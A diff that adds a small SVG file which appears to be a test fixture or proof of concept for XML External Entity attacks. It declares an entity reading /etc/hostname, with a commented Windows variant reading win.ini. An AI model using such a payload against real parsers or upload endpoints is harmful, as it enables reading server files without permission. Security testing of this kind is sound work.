@@ -1,0 +1,7 @@
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&xxe;</text>
+  <!-- Windows example: <text>&win;</text> with <!ENTITY win SYSTEM "file:///C:/Windows/win.ini"> -->
+</svg>
+
